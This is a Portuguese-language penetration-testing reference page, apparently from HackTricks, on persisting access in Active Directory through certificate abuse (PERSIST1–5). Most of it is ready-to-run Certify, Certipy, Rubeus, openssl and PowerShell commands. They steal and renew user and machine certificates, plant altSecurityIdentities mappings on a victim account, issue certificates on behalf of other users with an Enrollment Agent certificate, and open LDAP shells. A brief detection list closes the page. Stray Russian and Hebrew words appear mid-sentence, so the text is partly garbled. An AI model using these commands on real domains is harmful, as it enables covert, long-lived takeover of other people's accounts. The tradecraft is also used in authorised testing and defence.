# AD CS Account Persistence

{{#include ../../../banners/hacktricks-training.md}}

**Este é um pequeno resumo dos capítulos de account persistence da incrível pesquisa de [https://specterops.io/assets/resources/Certified_Pre-Owned.pdf](https://specterops.io/assets/resources/Certified_Pre-Owned.pdf)**

## Entendendo o roubo de credenciais de usuários ativos com Certificates – PERSIST1

Em um cenário em que um certificate que permite autenticação no domain pode ser solicitado por um user, um attacker tem a oportunidade de solicitar e roubar esse certificate para manter persistence em uma network. Por padrão, o template `User` no Active Directory permite esse tipo de request, embora às vezes ele possa estar desabilitado.

Usando [Certify](https://github.com/GhostPack/Certify) ou [Certipy](https://github.com/ly4k/Certipy), você pode procurar templates habilitados que permitem client authentication e então solicitar um:
```bash
# Enumerate client-auth capable templates
Certify.exe find /clientauth

# Newer Certify 2.0 syntax with filtering to enabled client-auth templates
Certify.exe enum-templates --filter-enabled --filter-client-auth --hide-admins

# Request a user cert from an Enterprise CA (current user context)
Certify.exe request /ca:CA-SERVER\CA-NAME /template:User

# Using Certipy (RPC/DCOM/WebEnrollment supported). Saves a PFX by default
certipy req -u 'john@corp.local' -p 'Passw0rd!' -ca 'CA-SERVER\CA-NAME' -template 'User' -out user.pfx
```
O poder de um certificate está em sua capacidade de autenticar como o user ao qual ele pertence, независимо de mudanças de password, desde que o certificate permaneça válido.

Você pode converter PEM para PFX e usá-lo para obter um TGT:
```bash
# Convert PEM returned by Certify to PFX
openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx

# Use certificate for PKINIT and inject the TGT
Rubeus.exe asktgt /user:john /certificate:C:\Temp\cert.pfx /password:CertPass! /ptt

# Or with Certipy
certipy auth -pfx user.pfx -dc-ip 10.0.0.10
```
> Nota: Combinado com outras técnicas (veja as seções THEFT), a autenticação baseada em certificados permite acesso persistente sem tocar no LSASS e até mesmo a partir de contextos não elevados.

## Obtendo Persistência de Máquina com Certificates - PERSIST2

Se um atacante tem privilégios elevados em um host, ele pode inscrever a conta de máquina do sistema comprometido para um certificate usando o template padrão `Machine`. Autenticar-se como a máquina habilita S4U2Self para serviços locais e pode fornecer persistência duradoura no host:
```bash
# Request a machine certificate as SYSTEM
Certify.exe request /ca:dc.theshire.local\theshire-DC-CA /template:Machine /machine

# Authenticate as the machine using the issued PFX
Rubeus.exe asktgt /user:HOSTNAME$ /certificate:C:\Temp\host.pfx /password:Passw0rd! /ptt
```
## Estendendo a Persistência Através da Renovação de Certificados - PERSIST3

Abusar dos períodos de validade e renovação dos modelos de certificado permite que um atacante mantenha acesso de longo prazo. Se você possui um certificado emitido anteriormente e sua chave privada, você pode renová-lo antes da expiração para obter uma credencial nova e de longa duração, sem deixar artefatos adicionais de solicitação ligados ao principal original.
```bash
# Renewal with Certipy (works with RPC/DCOM/WebEnrollment)
# Provide the existing PFX and target the same CA/template when possible
certipy req -u 'john@corp.local' -p 'Passw0rd!' -ca 'CA-SERVER\CA-NAME' \
-template 'User' -pfx user_old.pfx -renew -out user_renewed.pfx

# Native Windows renewal with certreq
# (use the serial/thumbprint of the cert to renew; reusekeys preserves the keypair)
certreq -enroll -user -cert <SerialOrID> renew [reusekeys]
```
> Dica operacional: monitore os tempos de vida dos arquivos PFX sob controle do atacante e renove com antecedência. A renovação também pode fazer com que certificados atualizados incluam a modern SID mapping extension, mantendo-os utilizáveis sob regras mais rígidas de mapeamento do DC (veja a próxima seção).

## Plantando Explicit Certificate Mappings (altSecurityIdentities) – PERSIST4

Se você puder gravar no atributo `altSecurityIdentities` de uma conta alvo, você pode mapear explicitamente um certificado controlado pelo atacante para essa conta. Isso persiste através de mudanças de senha e, ao usar formatos de mapeamento fortes, continua funcional sob a aplicação moderna do DC.

Fluxo de alto nível:

1. Obtenha ou emita um certificado de client-auth que você controla (por exemplo, registre o template `User` como você mesmo).
2. Extraia um identificador forte do cert (Issuer+Serial, SKI, ou SHA1-PublicKey).
3. Adicione um mapeamento explícito no `altSecurityIdentities` do principal vítima usando esse identificador.
4. Autentique-se com seu certificado; o DC o mapeia para a vítima via o mapeamento explícito.

Exemplo (PowerShell) usando um mapeamento forte Issuer+Serial:
```powershell
# Example values - reverse the issuer DN and serial as required by AD mapping format
$Issuer  = 'DC=corp,DC=local,CN=CORP-DC-CA'
$SerialR = '1200000000AC11000000002B' # reversed byte order of the serial
$Map     = "X509:<I>$Issuer<SR>$SerialR"

# Add mapping to victim. Requires rights to write altSecurityIdentities on the object
Set-ADUser -Identity 'victim' -Add @{altSecurityIdentities=$Map}
```
Em seguida, autentique-se com seu PFX. O Certipy obterá um TGT diretamente:
```bash
certipy auth -pfx attacker_user.pfx -dc-ip 10.0.0.10

# If PKINIT is unavailable on the DC, reuse the same persisted cert via Schannel/LDAPS
certipy auth -pfx attacker_user.pfx -dc-ip 10.0.0.10 -ldap-shell
```
### Construindo mapeamentos fortes de `altSecurityIdentities`

Na prática, os mapeamentos **Issuer+Serial** e **SKI** são os formatos fortes mais fáceis de construir a partir de um certificado em posse do atacante. Isso importa após **11 de fevereiro de 2025**, quando os DCs passam a usar **Full Enforcement** por padrão e os mapeamentos fracos deixam de ser confiáveis.
```bash
# Extract issuer, serial and SKI from a cert/PFX
openssl pkcs12 -in attacker_user.pfx -clcerts -nokeys -out attacker_user.crt
openssl x509 -in attacker_user.crt -noout -issuer -serial -ext subjectKeyIdentifier
```

```powershell
# Example strong SKI mapping for a user or computer object
$Map = 'X509:<SKI>9C4D7E8A1B2C3D4E5F60718293A4B5C6D7E8F901'
Set-ADUser -Identity 'victim' -Add @{altSecurityIdentities=$Map}
# Set-ADComputer -Identity 'WS01$' -Add @{altSecurityIdentities=$Map}
```
Notes
- Use strong mapping types only: `X509IssuerSerialNumber`, `X509SKI`, or `X509SHA1PublicKey`. Formatos fracos (Subject/Issuer, Subject-only, RFC822 email) estão deprecated e podem ser bloqueados pela política do DC.
- O mapeamento funciona tanto em objetos de **user** quanto de **computer**, então acesso de escrita ao `altSecurityIdentities` de uma conta de computador é suficiente para persistir como aquela máquina.
- A cadeia do certificado deve construir até uma root confiada pelo DC. Enterprise CAs em NTAuth normalmente são confiadas; alguns ambientes também confiam em public CAs.
- A autenticação via Schannel continua útil para persistence mesmo quando o PKINIT falha porque o DC não tem o EKU Smart Card Logon ou retorna `KDC_ERR_PADATA_TYPE_NOSUPP`.

#### 2025+ `Issuer/SID` explicit mappings

Em domain controllers **Windows Server 2022+** corrigidos com a atualização de segurança de **9 de setembro de 2025**, a Microsoft adicionou outro formato forte de explicit mapping que é atraente para persistence porque sobrevive à reemissão do certificado pela mesma CA:
```powershell
# Same issuer formatting rules as Issuer+Serial
$Issuer = 'DC=corp,DC=local,CN=CORP-DC-CA'
$SID    = 'S-1-5-21-1111111111-2222222222-3333333333-1105'
$Map    = "X509:<I>$Issuer<SID>$SID"
Set-ADUser -Identity 'victim' -Add @{altSecurityIdentities=$Map}
```
Operacionalmente, isso difere dos formatos fortes mais antigos:
- `Issuer+Serial` fixa **um certificado exato**.
- `SKI` / `SHA1-PUKEY` fixa **um keypair**.
- `Issuer/SID` fixa a **CA emissora + SID do alvo**, então certificados renovados ou reemitidos pela mesma CA continuam funcionando sem reescrever `altSecurityIdentities`.

Requisitos e ressalvas
- O certificado apresentado para logon deve realmente conter o SID da conta alvo na extensão de segurança SID.
- Esse formato não ajuda em certificados no estilo `ESC9` / `ESC16` que omitem a extensão SID; nesses casos, volte para `Issuer+Serial`, `SKI`, ou `SHA1-PUKEY`.

Para mais informações sobre weak explicit mappings e attack paths, veja:


{{#ref}}
domain-escalation.md
{{#endref}}

## Enrollment Agent as Persistence – PERSIST5

Se você obtiver um certificado válido de Certificate Request Agent/Enrollment Agent, você pode emitir novos certificados capazes de logon em nome de usuários à vontade e manter o PFX do agente offline como um persistence token. Fluxo de abuso:
```bash
# Request an Enrollment Agent cert (requires template rights)
Certify.exe request /ca:CA-SERVER\CA-NAME /template:"Certificate Request Agent"

# Mint a user cert on behalf of another principal using the agent PFX
Certify.exe request /ca:CA-SERVER\CA-NAME /template:User \
/onbehalfof:CORP\\victim /enrollcert:C:\Temp\agent.pfx /enrollcertpw:AgentPfxPass

# Or with Certipy
certipy req -u 'john@corp.local' -p 'Passw0rd!' -ca 'CA-SERVER\CA-NAME' \
-template 'User' -on-behalf-of 'CORP/victim' -pfx agent.pfx -out victim_onbo.pfx
```
A revogação do certificado do agente ou das permissões do template é necessária para expulsar essa persistência.

Operational notes
- Versões modernas do `Certipy` suportam tanto `-on-behalf-of` quanto `-renew`, então um atacante com um Enrollment Agent PFX pode emitir e depois renovar certificados leaf sem reinteragir com a conta alvo original.
- Se a recuperação de TGT baseada em PKINIT não for possível, o certificado on-behalf-of resultante ainda é utilizável para autenticação Schannel com `certipy auth -pfx victim_onbo.pfx -dc-ip 10.0.0.10 -ldap-shell`.

## Using Persisted Certificates When PKINIT Fails

Se o DC não tiver um certificado com capacidade de Smart Card Logon, o logon por certificado via PKINIT pode falhar com `KDC_ERR_PADATA_TYPE_NOSUPP`. Isso não mata o primitive de persistência: o mesmo PFX muitas vezes ainda é utilizável para acesso LDAP autenticado por Schannel.
```bash
# LDAPS / Schannel shell as the mapped principal
certipy auth -pfx attacker_user.pfx -dc-ip 10.0.0.10 -ldap-shell

# LDAP StartTLS fallback if 636 is filtered but 389/TLS is reachable
certipy auth -pfx attacker_user.pfx -dc-ip 10.0.0.10 -ldap-shell -ldap-scheme ldap -ldap-port 389
```
Isso é especialmente útil após PERSIST4/PERSIST5 porque você pode continuar operando a partir de Linux/macOS e encadear outras ações de persistência em diretório, como soltar [shadow credentials](../acl-persistence-abuse/shadow-credentials.md) ou editar atributos de delegação graváveis.

## 2025 Strong Certificate Mapping Enforcement: Impact on Persistence

A Microsoft KB5014754 introduziu o Strong Certificate Mapping Enforcement nos domain controllers. מאז **11 de fevereiro de 2025**, os DCs usam por padrão **Full Enforcement** para mapeamentos fracos/ambíguos e, a partir da atualização de segurança de **9 de setembro de 2025**, DCs corrigidos não suportam mais o antigo fallback do modo Compatibility. Implicações práticas:

- Certificados pré-2022 que não têm a extensão de mapeamento SID podem falhar no mapeamento implícito quando os DCs estão em Full Enforcement. Atacantes podem manter acesso renovando certificados por meio do AD CS (para obter a extensão SID) ou inserindo um mapeamento explícito forte em `altSecurityIdentities` (PERSIST4).
- Mapeamentos explícitos usando formatos fortes (`Issuer+Serial`, `SKI`, `SHA1-PUKEY` e, em DCs modernos, `Issuer/SID`) continuam funcionando. Formatos fracos (Issuer/Subject, Subject-only, RFC822) podem ser bloqueados e devem ser evitados para persistence.
- Se mapeamentos fracos ainda parecerem funcionar, assuma que você atingiu um DC sem patch ou com configuração diferente, e não um caminho confiável de persistence de longo prazo.
- Caminhos de emissão no estilo `ESC9` / `ESC16` que suprimem a extensão SID tornam `Issuer/SID` inutilizável, então mapeamentos fortes de fallback ou renovação via um template normal se tornam a opção prática de persistence.

Administradores devem monitorar e alertar sobre:
- Alterações em `altSecurityIdentities` e emissão/renovação de certificados de Enrollment Agent e User.
- Logs de emissão da CA para solicitações on-behalf-of e padrões incomuns de renovação.

## References

- [Microsoft Support – KB5014754: Certificate-based authentication changes on Windows domain controllers](https://support.microsoft.com/en-us/topic/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers-ad2c23b0-15d8-4340-a468-4d4f3b188f16)
- [SpecterOps – ADCS ESC14 Abuse Technique](https://specterops.io/blog/2024/02/28/adcs-esc14-abuse-technique/)
- [GhostPack/Certify Wiki – Account Persistence Techniques](https://github.com/GhostPack/Certify/wiki/2-%E2%80%90-Account-Persistence-Techniques)
- [Certipy Wiki – Command Reference](https://github.com/ly4k/Certipy/wiki/08-%E2%80%90-Command-Reference)
- [Almond Offensive Security – Authenticating with certificates when PKINIT is not supported](https://offsec.almond.consulting/authenticating-with-certificates-when-pkinit-is-not-supported.html)
- [Microsoft Community Hub – Introducing a new Issuer/SID AltSecID](https://techcommunity.microsoft.com/blog/publicsectorblog/introducing-a-new-issuersid-altsecid/4454231)

{{#include ../../../banners/hacktricks-training.md}}
